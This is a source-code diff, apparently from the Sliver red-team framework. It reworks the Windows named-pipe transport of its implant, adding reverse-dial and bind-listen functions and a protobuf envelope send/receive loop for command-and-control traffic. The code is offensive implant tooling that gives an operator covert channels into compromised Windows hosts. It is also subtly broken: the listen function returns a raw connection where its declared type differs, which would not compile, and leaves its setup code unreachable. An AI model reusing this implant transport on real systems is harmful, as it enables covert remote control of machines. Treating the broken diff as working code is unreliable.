@@ -18,22 +18,27 @@ package transports
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .NamePipec2Enabled}}
+// {{if .Config.NamePipec2Enabled}}
 
 import (
+	"bytes"
+	"encoding/binary"
+	"errors"
+	"fmt"
+	"io"
 	"net"
 	"net/url"
 	"strings"
-	"bytes"
-	"encoding/binary"
+	"sync"
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	"github.com/golang/protobuf/proto"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
+	"github.com/golang/protobuf/proto"
 )
 
 const (
@@ -41,20 +46,125 @@ const (
 	writeBufSizeNamedPipe = 1024
 )
 
-func namePipeDial(uri *url.URL) (net.Conn, error) {
+// namedPipeDial - Reverse Named Pipe implant transport (Windows only)
+func namedPipeDial(uri *url.URL) (*Connection, error) {
 	address := uri.String()
 	address = strings.ReplaceAll(address, "namedpipe://", "")
 	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Print("Named pipe address: ", address)
 	// {{end}}
-	return winio.DialPipe(address, nil)
+	conn, err := winio.DialPipe(address, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	// Set up RPC read/write loop over the named pipe.
+	connection, err := handleNamePipeConnection(conn)
+	if err != nil {
+		return nil, fmt.Errorf("failed to connect over named pipe: %s", err.Error())
+	}
+	if connection == nil {
+		return nil, errors.New("failed to connect over named pipe (unknown reason)")
+	}
+
+	return connection, nil
+}
+
+// namedPipeListen - Bind Named Pipe implant transport (Windows only)
+func namedPipeListen(uri *url.URL) (*Connection, error) {
+
+	address := uri.String()
+	address = strings.ReplaceAll(address, "namedpipe://", "")
+	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
+	// {{if .Config.Debug}}
+	log.Print("Named pipe listener address: ", address)
+	// {{end}}
+
+	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+address, nil)
+	// {{if .Config.Debug}}
+	log.Printf("Listening on %s", "\\\\.\\pipe\\"+address)
+	// {{end}}
+	if err != nil {
+		return nil, err
+	}
+
+	for {
+		// Wait for only one server connection, and return after setting it up.
+		conn, err := ln.Accept()
+		if err != nil {
+			return nil, err
+		}
+		return conn, nil
+
+		// Set up RPC read/write loop over the named pipe.
+		connection, err := handleNamePipeConnection(conn)
+		if err != nil {
+			return nil, fmt.Errorf("failed to connect over named pipe: %s", err.Error())
+		}
+		if connection == nil {
+			return nil, errors.New("failed to connect over named pipe (unknown reason)")
+		}
+
+		return connection, nil
+	}
+}
+
+func handleNamePipeConnection(conn net.Conn) (*Connection, error) {
+
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		IsOpen:  true,
+		cleanup: func() {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Config.Debug}}
+			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			namedPipeWriteEnvelope(&conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := namedPipeReadEnvelope(&conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	return connection, nil
 }
 
 func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Print("[namedpipe] Marshaling error: ", err)
 		// {{end}}
 		return err
@@ -63,7 +173,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
 	_, err = (*conn).Write(dataLengthBuf.Bytes())
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[namedpipe] Error %v and %d\n", err, dataLengthBuf)
 		// {{end}}
 	}
@@ -72,7 +182,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
 		totalWritten += n
 		if err2 != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[namedpipe] Error %v\n", err)
 			// {{end}}
 		}
@@ -81,7 +191,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 		missing := len(data) - totalWritten
 		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[namedpipe] Error %v\n", err)
 			// {{end}}
 		}
@@ -93,7 +203,7 @@ func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4)
 	_, err := (*conn).Read(dataLengthBuf)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[namedpipe] Error (read msg-length): %v\n", err)
 		// {{end}}
 		return nil, err
@@ -110,7 +220,7 @@ func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 			break
 		}
 		if err != nil {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("read error: %s\n", err)
 			// {{end}}
 			break
@@ -119,7 +229,7 @@ func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 	envelope := &sliverpb.Envelope{}
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[namedpipe] Unmarshaling envelope error: %v", err)
 		// {{end}}
 		return &sliverpb.Envelope{}, err
